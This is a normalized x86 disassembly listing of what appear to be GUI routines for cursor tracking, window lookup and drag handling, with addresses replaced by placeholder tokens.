movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_43c32c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_43b558
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_44648c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_43c05c
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_43c49c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_43c641
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_40348c
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_40348c
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43b860
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43c32c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43b748
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_444968
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_412618
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_43dc64
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_412618
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_43c660
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_40348c
mov ebx eax
sub_43c6d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_43c9a0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_43c92e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_43b5a0
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403440
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_43c660
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_43bf8c
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_4465e8
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c935
mov eax [ rw-data ]
call sub_403290
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_4553f0
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_43f334
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_43be58
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_45905c
sub_43c935
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40341c
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_40341c
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
sub_43c9c4
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_43afd8
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43c9f8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_43c9c4
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_43dc90
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_442254
test eax eax
je r-xdata
mov esi eax
sub_43ca40
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_413918
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx ] eax
sub_43ca68
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_413bb8
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403290
xor eax eax
mov [ ebx ] eax
sub_43ca88
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43cab8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_413de0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43cb68
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413e44
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_43cb41
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_43ccf4
call sub_403ac8
call sub_403ac8
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413a74
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_41d5f8
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_43cb74
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_413de0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43cc12
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cc19
mov eax [ rw-data ]
call sub_413e44
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_43cbea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43ccf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41d654
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413a74
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41d5f8
test al al
je r-xdata
sub_43cc20
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax esi
call sub_43ccf4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d128
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_43cc4c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d7fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_41d800
mov eax [ ebp - 0x4 ]
call sub_43cd40
mov eax [ rw-data ]
call sub_413de0
mov ebx eax
xor eax eax
push ebp
push sub_43ccd1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_413918
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413e44
retn
call sub_43cab8
sub_43ccf4
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_41d800
mov edx ebx
mov eax [ rw-data ]
call sub_413df4
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_43cd40
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43e790
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_43cd6c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403260
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_43cda8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_414114
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_43cdf0
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_43ceac
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43cf79
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cf80
lea eax [ ebp - 0x1c ]
call sub_403fe0
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_40348c
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_44db6c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408c10
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_404034
sub_43cf9c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43d003
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44a780
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_43e14c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov edx [ eax + 0x64 ]
pop eax
call sub_4043ec
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d00a
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov al 0x1
sub_43d010
push ebx
mov ebx eax
mov eax ebx
call sub_44a7a8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43d044
push ebx
mov ebx eax
mov eax ebx
call sub_44a7f8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_4043ec
je r-xdata
mov al 0x1
pop ebx
retn
sub_43d07c
push ebx
mov ebx eax
mov eax ebx
call sub_44a834
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43d0b0
push ebx
mov ebx eax
mov eax ebx
call sub_419d1c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43d0d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43e17c
sub_43d0f8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_43d118
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_404034
sub_43d13c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_43e06c
sub_43d15c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_43d188
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_4043ec
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_43d1ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43dac8
sub_43d20c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43dab4
sub_43d22c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_43d24c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41942c
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c554
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43e1fc
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43cd6c
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_43f0f4
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_43d324
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_40361c
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_45cf74
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403604
push edi
xor ecx ecx
mov edx 0xb039
call sub_43f334
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_43daec
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_40348c
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403290
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403290
mov eax [ edi + 0x68 ]
call sub_403290
mov eax [ edi + 0x64 ]
call sub_408780
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419478
test bl bl
jle r-xdata
sub_43d3f0
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_43d418
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_40348c
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
